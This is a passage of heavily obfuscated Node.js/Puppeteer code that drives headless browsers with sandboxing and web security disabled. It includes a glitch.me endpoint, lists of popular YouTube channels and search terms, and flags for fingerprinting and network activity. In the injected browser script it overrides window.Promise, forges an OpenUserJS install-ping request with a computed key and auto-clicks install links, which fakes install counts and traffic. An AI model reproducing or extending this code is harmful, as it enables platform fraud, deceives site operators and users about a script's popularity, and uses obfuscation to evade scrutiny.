                K = Q[J - (0x8 * 0x4 + -0x1 * 0xbdb + 0x5df * 0x2)] ^ Q[J - (-0x1bb5 + 0x1217 * -0x2 + 0x3feb)] ^ Q[J - (-0xaba + -0x24fa + -0x1 * -0x2fc2)] ^ Q[J - (0x2530 + -0x2f * -0x1 + -0x254f)], Q[J] = K << -0x71 * 0x1 + 0x2203 + -0x2191 * 0x1 | K >>> 0x224 * 0x10 + 0x26c2 + 0x48e3 * -0x1;
              for (J = -0x1a86 + 0x16eb * -0x1 + 0x3171; J < 0x5d * 0x2f + 0x3 * 0x7f4 + -0x28db; J += -0x240c + 0xe * 0xa6 + 0x1afd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5 * -0x15a + -0xe80 + -0x1 * -0x7c3 | L >>> -0x1 * 0x210d + -0x1ffb + -0x1d * -0x23f) + (M & N | ~M & O) + P + (0xc9f9d * -0x8b0 + -0x979fcd99 + -0x35a3be * -0x68f) + Q[J] << 0x2 * 0xa44 + 0x1 * -0x301 + 0x1 * -0x1187) << -0x3b * -0x2e + -0x22f8 + -0x1 * -0x1863 | P >>> -0x1a1 + -0x3cc * 0x6 + 0x1884) + (L & (M = M << -0x1d6 + 0xb32 * -0x2 + 0x616 * 0x4 | M >>> -0xbcd + -0x2b * 0x2f + 0x1 * 0x13b4) | ~L & N) + O + (0x8392cec7 + -0x4d1793c2 + 0x24073e94) + Q[J + (-0x1 * 0x7a + -0x16 * 0x8d + 0xc99)] << 0x4 * -0x89c + -0xf51 * -0x1 + -0x5 * -0x3d3) << -0x2541 + 0x1 * -0x133d + 0x3883 | O >>> -0x1063 + -0x6f + -0x26b * -0x7) + (P & (L = L << -0x1357 + -0x1 * -0x22c3 + -0x2 * 0x7a7 | L >>> -0x13de + -0x5d1 * -0x6 + -0x1 * 0xf06) | ~P & M) + N + (0x35da8f37 + 0x456c693d + -0x189 * 0x155843) + Q[J + (-0x3 * 0x5be + 0x8 * -0x2b4 + 0x26dc)] << -0x1a98 + -0x12a0 + 0x8 * 0x5a7) << -0x192d * -0x1 + 0x2 * -0x6b6 + 0x1 * -0xbbc | N >>> -0x1 * 0x2479 + -0x1bc4 + 0x4 * 0x1016) + (O & (P = P << -0x2 * -0xbaf + 0x579 + -0x9 * 0x331 | P >>> -0x118f + 0x709 + -0x4 * -0x2a2) | ~O & L) + M + (0x830c7b41 + -0x48717a41 + -0x1fe77899 * -0x1) + Q[J + (-0x969 + -0x2cf * 0x7 + -0x1d15 * -0x1)] << -0x6 * -0x9a + -0x175d * -0x1 + -0x1af9) << -0xadd + -0xf59 + 0x1a3b | M >>> -0x23cb + 0x4 * -0x169 + -0x298a * -0x1) + (N & (O = O << -0x10f * -0x9 + 0x661 + -0x7e5 * 0x2 | O >>> 0x77 * -0x47 + 0x1 * -0x2681 + 0x4784) | ~N & P) + L + (0x1b10dc8 + 0x8 * -0xf6077b0 + 0xd3d52951) + Q[J + (-0x1de9 + 0x1e45 + 0x2 * -0x2c)] << 0x9 * -0x17e + -0x3d * 0x83 + 0x40f * 0xb, N = N << -0x14b * 0x1b + -0x191d + -0x2 * -0x1e12 | N >>> 0x2 * -0xeff + -0xa04 * -0x3 + -0x3 * 0x4;
              for (; J < -0x43 * -0x8 + -0x1141 + 0xf51; J += -0x1e90 + -0xd9a + -0x2c2f * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x18d * -0x19 + 0xa67 + 0x1c63 | L >>> -0x1 * -0x99 + 0x3 * -0x765 + 0x3 * 0x73b) + (M ^ N ^ O) + P + (0x7f9fb7da + -0x204111f4 + 0xf7b45bb) + Q[J] << -0xbb4 + 0x7a * -0x43 + -0x15d1 * -0x2) << 0x1b9f * 0x1 + 0x1 * -0x1fda + -0x88 * -0x8 | P >>> 0xcff + 0xda2 * 0x2 + 0xa0a * -0x4) + (L ^ (M = M << -0xcc6 + -0x15c0 + -0x5c6 * -0x6 | M >>> -0x37a + 0x2459 + -0x20dd) ^ N) + O + (-0x387 * 0x467bd + 0x46a8df03 + 0x37baf849) + Q[J + (0x1033 * -0x1 + -0x29 + 0x105d)] << 0x1 * -0x1e2b + -0x4 * -0xc7 + 0x1b0f) << -0xaf + -0x1 * 0x340 + 0x3f4 | O >>> -0x95 * 0x2f + 0x1 * 0x1875 + 0x301 * 0x1) + (P ^ (L = L << -0x4f0 + 0x1 * 0xd54 + -0x846 | L >>> -0x251a + -0x382 * -0x3 + 0x1a96) ^ M) + N + (-0x2 * -0x20b2fadb + 0x1 * -0x6f4a5715 + 0xd0fdbc * 0xc0) + Q[J + (-0x808 * 0x2 + -0xfad + 0x2b * 0xbd)] << -0x52f + -0x15b7 + 0x139 * 0x16) << -0x1 * -0x104e + 0x23cd + -0x2 * 0x1a0b | N >>> -0xe5 * -0x7 + -0xf * -0x241 + -0x27f7) + (O ^ (P = P << 0x5dc + -0xaad + 0x4ef | P >>> 0xb6 + 0x21c7 * -0x1 + 0x2113) ^ L) + M + (-0x49279eef + 0x1c0c139 * -0x39 + 0x2c66ad * 0x665) + Q[J + (0xaab * 0x1 + 0x1 * 0x1cc3 + 0x276b * -0x1)] << 0x17f * -0x14 + 0xb83 + 0x1269) << -0x14d8 + 0x1e95 + 0x9b8 * -0x1 | M >>> 0x202a + -0x27f * -0x4 + -0xe5 * 0x2f) + (N ^ (O = O << -0x34f * -0x4 + 0x4c8 + -0x11e6 | O >>> -0x1f52 * -0x1 + 0x102c + -0x2f7c) ^ P) + L + (0x38de6a5a + -0x9347dcd1 * 0x1 + 0xc9435e18) + Q[J + (0x78 * 0x2b + 0x11 * -0xab + 0x8c9 * -0x1)] << -0x25d4 + 0x3a * -0x8d + 0x45c6, N = N << 0x4 * -0x81d + -0x2540 + 0x7c2 * 0x9 | N >>> 0x939 * -0x2 + 0x7a1 + 0xad3;
              for (; J < -0x7a3 + 0xf * 0x247 + 0xa * -0x2a1; J += -0x1117 + -0xe91 + 0x1fad)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2d4 + -0x2 * -0x46e + -0x603 * 0x1 | L >>> -0x22a7 + 0x1771 + 0xb51) + (M & N | M & O | N & O) + P - (-0x259 * -0x13830 + -0x378aa69d + -0xa5920111 * -0x1) + Q[J] << -0x9 * -0x146 + 0x148d + -0x95 * 0x37) << -0x315 * -0xb + 0x2097 + -0x4279 | P >>> 0x1 * 0x5cf + 0x24fb + -0x2aaf) + (L & (M = M << 0x1 * -0xa9c + 0x253d + -0x1a83 | M >>> 0x13 * -0x91 + 0x150b + -0x107 * 0xa) | L & N | M & N) + O - (-0x45 * 0x2c05f79 + 0x3c0f6621 + 0xf2ae98a0) + Q[J + (0x218d + 0x1 * 0x2433 + -0x45bf)] << -0xc77 + 0x182e + -0xbb7) << -0x3db * 0x2 + 0x1 * 0x5d3 + 0x1e8 | O >>> -0x3a * -0x2c + -0x3 * -0xbd3 + -0x67a * 0x7) + (P & (L = L << -0x202 * -0x8 + -0x1374 + 0x382 | L >>> -0x21c + -0x22ab + -0x3 * -0xc43) | P & M | L & M) + N - (0x115f62 * -0x4f0 + 0x297 * -0x20a404 + 0x11b33fd60) + Q[J + (-0xd14 + -0x2 * 0x35 + -0x120 * -0xc)] << 0x3a * -0x59 + 0x15f3 * -0x1 + 0x2a1d) << 0x4 * 0x7af + 0x15d + -0x2014 | N >>> 0xbd5 * 0x1 + 0x1fc7 + 0x1 * -0x2b81) + (O & (P = P << 0x32e + -0x1 * -0x254b + -0x1 * 0x285b | P >>> -0x1 * -0x141d + 0x641 * -0x5 + 0xb2a) | O & L | P & L) + M - (-0xd5046c8a + -0x2327 * -0x524b + 0x13a9be541) + Q[J + (0x4b1 + -0xa37 * -0x1 + -0xee5 * 0x1)] << 0x1c7a + 0xe35 * 0x2 + -0x4 * 0xe39) << 0x6d5 * 0x5 + -0x981 + -0x18a3 | M >>> 0x223b + 0x1 * -0x17b6 + 0x1 * -0xa6a) + (N & (O = O << -0x13 * -0x185 + 0x1f40 + -0x3c01 | O >>> 0xcfc * -0x1 + -0x24e2 + 0x3 * 0x10a0) | N & P | O & P) + L - (-0x3237ad * -0x1c8 + 0x464d1019 + -0xf9ea85f * 0x3) + Q[J + (0xe2 * -0x24 + 0xea + -0x2 * -0xf71)] << 0x2388 + 0x40 + -0x23c8, N = N << 0x1250 + -0xf5 * 0x16 + 0x2dc | N >>> 0x121 * 0x9 + -0x655 * -0x1 + -0x107c;
              for (; J < 0x141b + 0x2f * 0x5 + -0x14b6; J += 0x2 * -0x355 + -0x836 * -0x2 + -0x9bd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xfd4 * 0x2 + -0x3 * -0x2df + 0x1710 | L >>> -0x19a3 + -0x1c64 * -0x1 + -0x71 * 0x6) + (M ^ N ^ O) + P - (0x32054ad4 + 0x4b36a3fb + -0x479eb0a5) + Q[J] << 0x2576 + 0x83 * 0x1f + -0x3553) << 0x1f1f + -0xc71 + -0x1 * 0x12a9 | P >>> -0x129b * 0x1 + -0x8 * 0x2e + 0x1426) + (L ^ (M = M << 0x15a7 + -0x1445 * -0x1 + -0x29ce | M >>> 0x4 * -0xbf + 0x6bc + -0x3be) ^ N) + O - (0x3102bd11 + -0x30eaaedc + 0xb * 0x4dd8fff) + Q[J + (-0x5b * -0x7 + -0x2 * 0xcd9 + 0x1736 * 0x1)] << 0xaaa + 0x2 * -0x12a4 + 0x1a9e) << 0x3af * 0x1 + 0x1b * 0x143 + 0xd * -0x2e7 | O >>> -0x2 * -0x7b9 + -0x2608 + 0x16b1) + (P ^ (L = L << 0x2f6 * 0xb + 0x1070 + -0x30e4 | L >>> 0xca2 + 0x1 * -0x13a8 + -0x168 * -0x5) ^ M) + N - (0x5cd79ead + -0x1 * -0x64a4a94c + -0x8bdf09cf) + Q[J + (0x4b1 * -0x2 + -0x57 * 0x22 + 0x14f2)] << 0x59d + -0x1 * -0x1165 + -0x1702) << -0x12b5 * -0x2 + 0x22a2 + -0x4807 | N >>> 0xb2 * 0x3 + 0x135a * 0x1 + -0x1555 * 0x1) + (O ^ (P = P << -0x6e6 * 0x4 + 0x1e + 0x8 * 0x373 | P >>> 0x25bb + 0xc70 + 0x1 * -0x3229) ^ L) + M - (-0x863d036 + -0x5e2da7a7 + 0x9c2eb607) + Q[J + (-0x1254 + -0x1cfb * 0x1 + 0x2f52)] << -0x38e * -0x9 + 0x24 * 0xce + -0x2 * 0x1e7b) << -0x59 * 0x30 + -0x6a8 + 0x1 * 0x175d | M >>> 0x4 * 0x3c7 + -0xdd * -0xf + 0x1 * -0x1bf4) + (N ^ (O = O << -0xaa3 * -0x1 + 0x1385 * 0x2 + -0x318f | O >>> -0x213 + 0x1e7 * -0xa + 0x151b) ^ P) + L - (0x30a6 * 0x1beec + 0x43cc47b4 + -0x8bbb * 0xb596) + Q[J + (-0x565 * -0x5 + -0x33 * -0xbf + -0x4102)] << -0x48 * -0xc + 0xfbd + -0x1 * 0x131d, N = N << 0x26a4 + -0x2029 * 0x1 + -0x65d | N >>> 0x32d * 0x1 + 0xa * 0x17c + -0x9f * 0x1d;
              this['h0'] = this['h0'] + L << -0xfba * -0x1 + 0x523 * -0x1 + -0xa97, this['h1'] = this['h1'] + M << 0x1160 + -0x1be6 + 0xa86, this['h2'] = this['h2'] + N << 0xedb + -0x1786 + 0x1 * 0x8ab, this['h3'] = this['h3'] + O << 0xdf6 * 0x2 + -0x12ef * 0x2 + -0x43 * -0x26, this['h4'] = this['h4'] + P << 0x9f8 + 0x2075 + -0x2a6d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x175d * -0x1 + -0x26f * 0x2 + 0x1c57 & 0xab2 + -0x20 * -0x101 + 0x7b * -0x59] + w[J >> -0x4b3 + 0x2181 + 0x20d * -0xe & -0xbbe * 0x3 + 0x13a * -0x2 + 0x25bd] + w[J >> 0xa * -0xcb + -0x1a0b + 0x220d & 0x1917 * -0x1 + -0xc47 + 0x256d] + w[J >> 0x167 + 0xf67 + -0x10be & -0x1f9c + 0x193 + 0x1e18] + w[J >> -0x1e9 + -0x196b + 0x60 * 0x49 & 0x1733 + -0x1 * -0x14d1 + -0x2bf5] + w[J >> 0x1 * 0x24ba + -0x1aae + -0xa04 & 0xaf * 0x32 + -0x1b6a + -0x6b5 * 0x1] + w[J >> -0x1b18 + 0x5 * -0x24b + 0x2693 & -0x7b * 0x2b + -0xb * -0x14c + 0x674] + w[-0x3 * 0xb99 + 0x207a * -0x1 + 0x4354 & J] + w[K >> 0x84e + -0x241 * -0x1 + -0xa73 & 0x4bd * -0x4 + -0x1 * 0x1c5d + 0x2f60] + w[K >> -0x2426 + 0x2544 + -0x106 & 0x14 * 0x9f + -0x1722 * -0x1 + -0x2bb * 0xd] + w[K >> 0x194f + 0x25d2 + 0x3f0d * -0x1 & -0xd * -0x2ab + -0x1 * -0x184b + -0x1 * 0x3aeb] + w[K >> -0x19 * -0xa6 + -0x203 * -0x2 + 0x50b * -0x4 & 0x11ea * 0x1 + -0x1e5 * -0x7 + -0x1f1e] + w[K >> 0x43 * -0x4c + -0x8d2 * 0x2 + 0x2594 & -0x93 * -0xd + 0x14dc + -0x1c44] + w[K >> 0x3ff + 0x1 * -0x155 + -0x2a2 & 0x5f0 + -0x2 * 0x501 + -0x97 * -0x7] + w[K >> 0x27b * -0x2 + 0x248d + -0x1f93 & -0x25cf + -0x13f3 + -0x169 * -0x29] + w[0x2e7 * -0x9 + 0x1c85 + -0x257 & K] + w[L >> 0x218 * 0x2 + -0x79a * 0x2 + 0xb20 & -0xaa3 * -0x1 + 0x6 * 0x588 + 0x2 * -0x15e2] + w[L >> -0x7e4 + 0x151 * 0x1c + -0x4d0 * 0x6 & 0x1dd9 + -0x1ca2 + 0x8 * -0x25] + w[L >> -0x24f5 + 0x1393 + 0x1bf * 0xa & 0x3 * 0x241 + -0x1c1 * 0x16 + 0x1fe2] + w[L >> -0x1 * -0x184 + -0x11 * -0x1b7 + -0x1e9b & -0x1 * 0x1cfb + -0x2f * -0x49 + 0xfa3] + w[L >> 0x80c + 0x1 * -0x1bb + 0xf * -0x6b & -0x2 * -0x860 + -0x79d * 0x4 + 0xdc3] + w[L >> -0x41 * -0x94 + -0x275 + -0x2317 & -0x449 * 0x2 + -0x1 * -0x1ddb + 0xb * -0x1ee] + w[L >> 0x5 * -0x44a + 0x6eb + 0xe8b & 0x1831 + -0x1cba + 0x498] + w[0x236e + 0x592 + -0x2f * 0xdf & L] + w[M >> -0x1c9b + -0x227b + -0x1 * -0x3f32 & -0x22b0 + 0x13b5 + 0xf0a] + w[M >> -0x26f + -0x242a * -0x1 + -0x1 * 0x21a3 & -0x1362 + 0x7 * -0x3d9 + 0x2e60] + w[M >> 0x1513 + -0x7c * -0x35 + -0x1 * 0x2eab & 0x3a5 * 0x1 + 0x1aa1 + -0x1e37] + w[M >> 0x2b * 0x6b + 0x1acb + -0x2cb4 & -0x25ad + 0x1177 + 0x1445 * 0x1] + w[M >> 0x1e75 * -0x1 + -0x244b + 0x42cc & 0x1014 + -0x1148 * -0x2 + -0x3295] + w[M >> -0x1 * -0xff + -0xb73 * -0x1 + 0x1c6 * -0x7 & 0x128 * 0x6 + 0x1f31 * 0x1 + 0x376 * -0xb] + w[M >> 0xf5e + -0x16ad + 0x177 * 0x5 & 0x3d * -0x89 + 0x1655 + 0xa5f] + w[0x1fa7 + 0x10 * 0x9e + -0x2978 & M] + w[N >> 0x1a1a + -0x1359 * 0x1 + -0x6a5 * 0x1 & 0x1ec0 + -0x140f + -0xaa2] + w[N >> -0x240b * 0x1 + 0x25 * 0x2 + -0x1e3 * -0x13 & -0x647 + -0x1ee * -0x5 + -0x350 * 0x1] + w[N >> -0x1dee + -0x4b8 * -0x1 + 0x194a & -0x97 * -0x9 + 0x1 * -0x23be + -0x1e7e * -0x1] + w[N >> -0x183 * 0x2 + 0x1 * 0x1d83 + 0x8cf * -0x3 & -0x1153 * -0x2 + 0x1b70 + -0x3e07] + w[N >> 0x139 * 0x1a + 0x1 * -0xc86 + -0x148 * 0xf & -0xbde + 0x1 * -0x1517 + 0x2104] + w[N >> -0x4 * -0x8ef + 0x11f9 * 0x1 + -0x35ad & -0x24b9 + 0x117b + 0x134d] + w[N >> -0x869 + -0x23a6 + 0x2c13 & 0x12b1 + -0x41 * 0x4f + 0x16d] + w[0x2513 + 0x1ce6 + -0x41ea & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * 0x7ab + -0x1 * 0x1c7b + 0x1be * 0xc & -0x837 + -0x18d + 0xac3,
                J >> -0x26e6 + -0xb * 0x316 + 0x48e8 & -0x1a * -0xd7 + -0x69e + -0x1 * 0xe39,
                J >> 0x17e8 + -0xd2d + 0x391 * -0x3 & -0x1e6d + 0x15b1 + 0x9bb,
                0x11 * -0x1f6 + 0x1 * -0x26ae + 0x1 * 0x4903 & J,
                K >> 0x1b31 + 0x1e88 * 0x1 + -0x39a1 & -0x3 * -0x691 + 0x1 * -0x6f + -0x3 * 0x617,
                K >> 0x11ba + 0xc1 * 0x1 + -0x126b & -0xe8f * 0x2 + -0x42e + 0x224b,
                K >> -0x1 * 0x3c7 + 0x35f * 0x3 + 0x21a * -0x3 & 0x2 * -0x397 + 0xcb * -0x2b + 0xe * 0x305,
                -0x4 * 0x83 + 0x1115 * 0x1 + -0x1 * 0xe0a & K,
                L >> -0x3 * 0x4bd + -0x119a + -0x3 * -0xaa3 & -0x26ac + 0x21cb + 0x5e0,
                L >> 0x1 * -0x135f + -0x1621 * -0x1 + -0x2b2 & 0x1946 + -0x14c + -0x16fb,
                L >> -0x64b + -0x28 + 0x7 * 0xed & -0x945 * 0x1 + 0x15d * -0x13 + -0xc5 * -0x2f,
                0x102f * 0x1 + 0x1048 + 0x98 * -0x35 & L,
                M >> -0x1c8d + -0x1529 + 0x31ce & -0x78e + 0x1065 + -0x7d8,
                M >> 0x53e + -0x7f * 0x19 + -0x739 * -0x1 & 0x1449 + -0x29 * 0xd7 + 0xf25 * 0x1,
                M >> 0x12 * 0x4c + 0x26cb + -0x2c1b * 0x1 & 0x7 * -0x323 + -0x31f + 0x1a13,
                0x2 * -0x3b3 + 0x884 + -0x1f & M,
                N >> -0x1493 + -0x91 * 0xd + 0x1 * 0x1c08 & 0x5c * -0x3c + -0x1 * -0x1a17 + 0x388 * -0x1,
                N >> -0x90e * 0x1 + -0x1f0 + -0x2 * -0x587 & 0x1593 + -0x15 * 0xc4 + 0x4 * -0x120,
                N >> -0x2 * 0xc8c + 0x76f * -0x1 + 0x208f & -0x20d0 + -0x4f7 * -0x4 + 0xdf3,
                0x65 * 0x49 + 0x7 * -0x79 + 0x1 * -0x187f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x126 * 0x17 + 0x455 + -0x1629 * -0x1), (K = new DataView(J))['setUint32'](0x5cc + -0x2fd * 0x3 + 0x32b * 0x1, this['h0']), K['setUint32'](0xa6f * 0x1 + 0x4e0 + -0x2d * 0x57, this['h1']), K['setUint32'](0xc25 + 0x1 * 0x18a1 + -0x24be, this['h2']), K['setUint32'](-0xafd + -0xe9 * -0x23 + -0x14d2, this['h3']), K['setUint32'](-0xb59 + -0x4 * 0x86b + 0xf07 * 0x3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1d * 0x59 + 0x2 * -0xcf2 + 0x1 * 0x23f9];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x319 * 0x7 + 0x250f + -0xf60;
            J[0xa * -0x187 + 0x238e + -0x8 * 0x289]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x9f9 + 0x137 * 0x17 + -0x25ea] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2195 + -0x1c8b + -0x509), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x252d * 0x1 + 0x846 + 0x8 * 0x39d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x3 * -0x852 + 0xd3a + 0x466 * 0x4), Promise['resolve'](-0x614 + 0x19ee + 0x1 * -0x13d9);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1eba + 0x2 * -0x92b + 0x3110; j < 0x6c * 0x56 + -0x16cb + -0xd7c; j++)
    i();
}

function a() {
  const br = [
    'dwqkdmnBZc',
    'object',
    'W4lcT35RWQFcTCo9W5T5WQe',
    'W5NcQ2SQ',
    'qSorcSoiW7xcKfxdRb9j',
    'C2vLlxbLB3bSzq',
    'DgXLx19WBgf5qG',
    'tw9KC18Otw9Vtq',
    'pts/430255',
    'DxrOlwz0lxjPAW',
    'mpaign=soc',
    'e\x20Gecko)\x20C',
    '-btb',
    'zxj2ywWSignOzq',
    '/navchanda',
    '8.0.5359.1',
    'y29Tl0bsEwfUrW',
    'C3bSAxq',
    'sByClassNa',
    'y3jLyxrLsw5JBW',
    'Ahr0Chm6lY9NCG',
    'X89-SWNdIE',
    'lrJdGmknWP3dJSkn',
    'enuserjs.o',
    'ChrZlZmWmZeWlq',
    'r8kwWPddUCk3WPW',
    '\x20(KHTML,\x20l',
    's2L0lZuZnY4ZnG',
    'pts/444523',
    'goto',
    'ACk6W4JdTSo1WPdcVCkngt8',
    'CMCVC2nYAxb0CW'
  ];
  a = function() {
    return br;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x11c5 + 0xf8b + -0x148 * 0x1a);
    let h = e[f];
    if (b['syoLAV'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x942 + 0xb99 + -0x1 * 0x257, s, t, u = 0x3 * 0x496 + 0x1c2e + -0x29f0; t = n['charAt'](u++); ~t && (s = r % (0xae5 + -0xf69 + 0x122 * 0x4) ? s * (-0x68 * 0x16 + 0x37 * 0x94 + -0x169c) + t : t, r++ % (-0x1c3c + 0x1 * -0xb7 + 0x1cf7)) ? p += String['fromCharCode'](0x5ab + 0x1007 + 0x14b3 * -0x1 & s >> (-(-0x14c4 + 0x1659 + -0x193) * r & 0x15dd + -0x3d * -0x1d + -0x1cc0)) : -0x657 + -0x436 * 0x2 + 0xec3) {
          t = o['indexOf'](t);
        }
        for (let v = -0xdfb + -0x9 * -0x41 + 0x6 * 0x1f3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2306 * 0x1 + -0x35b + -0x2f5 * -0xd))['slice'](-(-0x1555 + 0x2179 + -0xc22));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0xb5 + -0x21b + 0x166,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x57 * 0x66 + 0x20 * -0xe + -0x20ea; u < 0x15 * 0x18d + 0x1d * 0x86 + -0x2ebf; u++) {
          p[u] = u;
        }
        for (u = -0x5 * -0x166 + 0x243c + 0xb * -0x3ee; u < 0x7 * -0x124 + 0x1e3 + 0x4f * 0x17; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1fd0 + -0x1 * 0x2631 + 0x761), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1959 + 0x49 * 0x87 + -0x11 * 0xc6, q = 0x206d + 0x22 * 0x6 + 0x3 * -0xb13;
        for (let v = -0x147c + 0x1ba + 0x12c2; v < n['length']; v++) {
          u = (u + (0x13f4 + -0x1dec + 0x25 * 0x45)) % (0x1aa6 + 0x7f * 0x24 + -0x2b82), q = (q + p[u]) % (-0x231 + -0x66d + 0x99e), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xcd9 + 0x204e + -0x2c27)]);
        }
        return t;
      };
      b['jdoWnY'] = m, c = arguments, b['syoLAV'] = !![];
    }
    const j = e[0x26ea + 0x2023 + -0x470d],
      k = f + j,
      l = c[k];
    return !l ? (b['iNWIOB'] === undefined && (b['iNWIOB'] = !![]), h = b['jdoWnY'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = 0x1e8 + -0x36a2 + -0x2 * -0x29fd + (0x18e3 + -0x29 * 0x1 + -0xd02) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * 0x7e1 + -0xfbd + 0x17a1 * 0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + Y(0x10) + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x55 * 0x74 + 0x130c + 0x1378; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 